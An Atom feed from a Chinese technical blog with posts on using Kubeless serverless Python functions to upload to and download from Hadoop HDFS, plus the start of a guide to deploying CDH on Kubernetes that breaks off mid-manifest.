<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://firsh.me/" rel="alternate" type="text/html" /><updated>2018-11-05T20:07:10+08:00</updated><id>http://firsh.me/</id><title type="html">张建新</title><subtitle>Flink，张建新技术博客，Kubernetes技术，虚拟化技术，微服务，容器技术,docker,Github, Google Kubernetes, kubernetes, Flink,Graphx,Spark,docker。</subtitle><author><name>unknow :)</name></author><entry><title type="html">seerverless操作hdfs上传数据。</title><link href="http://firsh.me/2018/11/05/kubeless-serverless-hdfs-put-data/" rel="alternate" type="text/html" title="seerverless操作hdfs上传数据。" /><published>2018-11-05T20:00:33+08:00</published><updated>2018-11-05T20:00:33+08:00</updated><id>http://firsh.me/2018/11/05/kubeless-serverless-hdfs-put-data</id><content type="html" xml:base="http://firsh.me/2018/11/05/kubeless-serverless-hdfs-put-data/">&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;

&lt;h2 id=&quot;kubernetes-serverless-操作-hadoop-hdfs&quot;&gt;kubernetes serverless 操作 Hadoop Hdfs&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;serverless Python 操作hdfs&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# /usr/bin/env python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# coding=utf-8&lt;/span&gt;

import paramiko
import os
from hdfs import Client
from bottle import route, run
from bottle import request

client &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Client&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://hdfs-web-svc.cloudera:50070&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 文件上传的HTML模板，这里没有额外去写html模板了，直接写在这里，方便点吧&lt;/span&gt;
@route&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/upload'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
def upload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'''
        &amp;lt;html&amp;gt;
            &amp;lt;head&amp;gt;
            &amp;lt;/head&amp;gt;
            &amp;lt;body&amp;gt;
                &amp;lt;form action&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;
                    &amp;lt;input type=&quot;file&quot; name=&quot;data&quot; /&amp;gt;
                    &amp;lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&amp;gt;
                &amp;lt;/form&amp;gt;
            &amp;lt;/body&amp;gt;
        &amp;lt;/html&amp;gt;
    '''&lt;/span&gt;


&lt;span class=&quot;c&quot;&gt;# 文件上传，overwrite=True为覆盖原有的文件，&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 如果不加这参数，当服务器已存在同名文件时，将返回“IOError: File exists.”错误&lt;/span&gt;
@route&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/upload'&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'POST'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
def doupload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
    upload &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; request.files.getall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'data'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;meta &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;upload:
        buf &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; meta.file.read&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
        name, ext &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; os.path.splitext&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;meta.filename&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;ext not &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.jar'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'.tar'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'File extension not allowed. type [JAR]'&lt;/span&gt;
        path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/task/mr/'&lt;/span&gt; + name + ext
        &lt;span class=&quot;c&quot;&gt;# ssh root@agent-2.agent-svc.cloudera.svc.cluster.local&lt;/span&gt;
        print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--------------save Task To&quot;&lt;/span&gt; + path&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        with client.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;path, &lt;span class=&quot;nv&quot;&gt;overwrite&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as writer:
            writer.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ok'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;serverless.yml&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Welcome to Serverless!&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# For full config options, check the kubeless plugin docs:&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#    https://github.com/serverless/serverless-kubeless&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# For documentation on kubeless itself:&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#    http://kubeless.io&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Update the service name below with your own service name&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;put-taskjar&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Please ensure the serverless-kubeless provider plugin is installed globally.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# $ npm install -g serverless-kubeless&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# ...before installing project dependencies to register this provider.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# $ npm install&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kubeless&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${env:K8S_NAMESPACE, 'cloudera'}&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;python2.7&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;serverless-kubeless&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;task.upload&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;具体信息看第一条关于 serverless 的文章。&lt;/li&gt;
&lt;/ul&gt;</content><author><name>unknow :)</name></author><summary type="html">转载请注明出处，本文采用 CC4.0 协议授权</summary></entry><entry><title type="html">通过Serverless 获取 hadoop 文件系统的[原创]</title><link href="http://firsh.me/2018/10/23/serverless-hadoop-hdfs-get/" rel="alternate" type="text/html" title="通过Serverless 获取 hadoop 文件系统的[原创]" /><published>2018-10-23T18:53:13+08:00</published><updated>2018-10-23T18:53:13+08:00</updated><id>http://firsh.me/2018/10/23/serverless-hadoop-hdfs-get</id><content type="html" xml:base="http://firsh.me/2018/10/23/serverless-hadoop-hdfs-get/">&lt;h2 id=&quot;通过serverless-kubeless-进行操作hdfs--实现下载文件&quot;&gt;通过Serverless (Kubeless) 进行操作Hdfs , 实现下载文件.&lt;/h2&gt;

&lt;h3 id=&quot;code&quot;&gt;code&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Python&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hdfs&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;bottle&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPResponse&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://hdfs-web-svc.cloudera:50070&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content-type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/octet-stream'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Disposition'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'attachment;filename=&quot;data.csv&quot;'&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/download'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/public/csv/parking_ths_car_record/part-m-00000&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ignore'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'gbk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTPResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;serverless.yml&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Welcome to Serverless!&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# For full config options, check the kubeless plugin docs:&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#    https://github.com/serverless/serverless-kubeless&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# For documentation on kubeless itself:&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#    http://kubeless.io&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Update the service name below with your own service name&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Please ensure the serverless-kubeless provider plugin is installed globally.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# $ npm install -g serverless-kubeless&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# ...before installing project dependencies to register this provider.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# $ npm install&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kubeless&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${env:K8S_NAMESPACE, 'cloudera'}&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;python2.7&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;serverless-kubeless&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;getfile&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;handler.getfile&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;requirements.txt&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;bottle==0.12.13
hdfs==2.1.0
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;kubernetes Ingress&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;extensions/v1beta1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Ingress&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile-ing&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile.kube.ibm-testing.com&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;paths&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;backend&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;serviceName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;servicePort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;相关地址&quot;&gt;相关地址&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://github.com/serverless/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;更多信息可以关注&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://github.com/kubeless/kubeless/tree/f49533233cd79b116113ea10454cb2ca234dadfd/docker/runtime&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">通过Serverless (Kubeless) 进行操作Hdfs , 实现下载文件.</summary></entry><entry><title type="html">kubernetes 部署cdh 通过 NASNFS）进行文件存储。</title><link href="http://firsh.me/2018/09/20/kubernetes-cdh-deploy/" rel="alternate" type="text/html" title="kubernetes 部署cdh 通过 NASNFS）进行文件存储。" /><published>2018-09-20T15:59:04+08:00</published><updated>2018-09-20T15:59:04+08:00</updated><id>http://firsh.me/2018/09/20/kubernetes-cdh-deploy</id><content type="html" xml:base="http://firsh.me/2018/09/20/kubernetes-cdh-deploy/">&lt;p&gt;技术验证篇，通过Kubernetes搭建一个可扩展的 CDH，并且启动hadoop。&lt;/p&gt;

&lt;h2 id=&quot;quick&quot;&gt;Quick&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;主要用到&lt;code class=&quot;highlighter-rouge&quot;&gt;Kubernetes&lt;/code&gt; 阿里云&lt;/li&gt;
  &lt;li&gt;镜像来源 &lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/windawings/spot-docker&lt;/code&gt; .&lt;/li&gt;
  &lt;li&gt;启动文件.&lt;code class=&quot;highlighter-rouge&quot;&gt;yaml&lt;/code&gt;文件&lt;/li&gt;
  &lt;li&gt;NAS 阿里云弹性存储 NAS&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;注意&quot;&gt;注意&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;NAS 需要开启&lt;code class=&quot;highlighter-rouge&quot;&gt;VPC&lt;/code&gt;网络安全组&lt;/li&gt;
  &lt;li&gt;镜像需要上传到自己的私有仓库&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Kubernetes 下载镜像需要配置&lt;code class=&quot;highlighter-rouge&quot;&gt;yaml &amp;lt;&amp;lt; imagePullSecrets&lt;/code&gt;,文章结尾会将&lt;code class=&quot;highlighter-rouge&quot;&gt;yaml&lt;/code&gt;奉上&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Kubernetes默认会创建一个&lt;code class=&quot;highlighter-rouge&quot;&gt;SLB&lt;/code&gt;（用来给Ingress 使用)，我们用来暴露CDH的&lt;code class=&quot;highlighter-rouge&quot;&gt;UI&lt;/code&gt;就是需要采用 &lt;code class=&quot;highlighter-rouge&quot;&gt;Ingress&lt;/code&gt; 来进行暴露。&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ingress&lt;/code&gt; 所在 &lt;code class=&quot;highlighter-rouge&quot;&gt;Namespace = kube-system&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/17612368-36b7-49c3-bcbd-6bd7848c849a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;域名解析 注意是&lt;code class=&quot;highlighter-rouge&quot;&gt;泛域名&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;开始部署&quot;&gt;开始部署&lt;/h2&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ServiceAccount&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sa&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;automountServiceAccountToken&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
